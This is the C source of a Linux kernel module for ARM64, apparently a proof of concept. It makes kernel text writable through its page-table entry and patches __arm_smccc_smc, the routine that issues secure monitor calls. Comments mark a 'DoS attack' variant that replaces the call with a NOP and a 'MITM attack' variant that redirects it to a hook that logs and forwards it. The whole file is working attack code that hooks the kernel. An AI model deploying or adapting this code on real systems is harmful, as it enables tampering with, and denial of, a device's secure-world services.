#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/arm-smccc.h>
#include <linux/mm.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan Castets");

#define ARM_NOP_INST 0xd503201f
#define ARM_SMC_INST 0xd4000003

static pte_t *ptep;
static struct mm_struct *mm;

asmlinkage void hook(unsigned long a0, unsigned long a1,
		     unsigned long a2, unsigned long a3,
		     unsigned long a4, unsigned long a5,
		     unsigned long a6, unsigned long a7,
		     struct arm_smccc_res *res,
		     struct arm_smccc_quirk *quirk)
{
	printk(KERN_INFO "r0 : %lx", a0);
	
	__asm__("smc #0;"
		"ldr x4, [sp];"
		"stp x0, x1, [x4];"
		"stp x2, x3, [x4,#16];"
		"ldr x4, [sp,#8];"
		"cbz x4, 0x00000028;"
		"ldr x9, [x4];"
		"cmp x9, #0x1;"
		"b.ne 0x00000028;"
		"str x6, [x4,#8];"
		"ret;");
}

static void set_pte_write(void)
{
	pte_t pte;

	pte = READ_ONCE(*ptep);
	
	pte = clear_pte_bit(pte, __pgprot(PTE_RDONLY));
	pte = set_pte_bit(pte, __pgprot(PTE_WRITE));
	
	set_pte_at(mm, (unsigned long)__arm_smccc_smc, ptep, pte);
}

static void set_pte_rdonly(void)
{
	pte_t pte;

	pte = READ_ONCE(*ptep);
	
	pte = clear_pte_bit(pte, __pgprot(PTE_WRITE));
	pte = set_pte_bit(pte, __pgprot(PTE_RDONLY));
	
	set_pte_at(mm, (unsigned long)__arm_smccc_smc, ptep, pte);
}

static void disable_smc_call(void)
{
	set_pte_write();

	/* DoS attack */
	*(uint32_t *)__arm_smccc_smc = ARM_NOP_INST;

	/* MITM attack */
	*(uint32_t *)(__arm_smccc_smc + 0) = 0x58000048;
	*(uint32_t *)(__arm_smccc_smc + 4) = 0xd61f0100;
	*(uint32_t *)(__arm_smccc_smc + 8) =
		(unsigned long)hook & 0x00000000ffffffff;
	*(uint32_t *)(__arm_smccc_smc + 12) =
		((unsigned long)hook & 0xffffffff00000000) >> 32;
	
	set_pte_rdonly();
}

static void enable_smc_call(void)
{
	set_pte_write();

	/* DoS attack */
	*(uint32_t *)__arm_smccc_smc = ARM_SMC_INST;

	/* MITM attack */
	*(uint32_t *)(__arm_smccc_smc + 0) = ARM_SMC_INST;
	*(uint32_t *)(__arm_smccc_smc + 4) = 0xe40340f9;
	*(uint32_t *)(__arm_smccc_smc + 8) = 0x800400a9;
	*(uint32_t *)(__arm_smccc_smc + 12) = 0x820c01a9;
	
	set_pte_rdonly();
}

int init_module(void)
{
	struct mm_struct init_mm;
	pgd_t *pgdp;
	pud_t *pudp;
	pmd_t *pmdp;

	printk(KERN_INFO "alpha module started");
	
	mm = (struct mm_struct *)kallsyms_lookup_name("init_mm");
	init_mm = *mm;

	pgdp = pgd_offset_k((unsigned long)__arm_smccc_smc);
	if (pgd_none(READ_ONCE(*pgdp))) {
		printk(KERN_INFO "failed pgdp");
		return 0;
	}
	
	pudp = pud_offset(pgdp, (unsigned long)__arm_smccc_smc);
	if (pud_none(READ_ONCE(*pudp))) {
		printk(KERN_INFO "failed pudp");
		return 0;
	}
	
	pmdp = pmd_offset(pudp, (unsigned long)__arm_smccc_smc);
	if (pmd_none(READ_ONCE(*pmdp))) {
		printk(KERN_INFO "failed pmdp");
		return 0;
	}
	
	ptep = pte_offset_kernel(pmdp, (unsigned long)__arm_smccc_smc);
	if (!pte_valid(READ_ONCE(*ptep))) {
		printk(KERN_INFO "failed pte");
		return 0;
	}
	
	disable_smc_call();
	return 0;
}

void cleanup_module(void)
{
	enable_smc_call();
	printk(KERN_INFO "alpha module stopped");
}
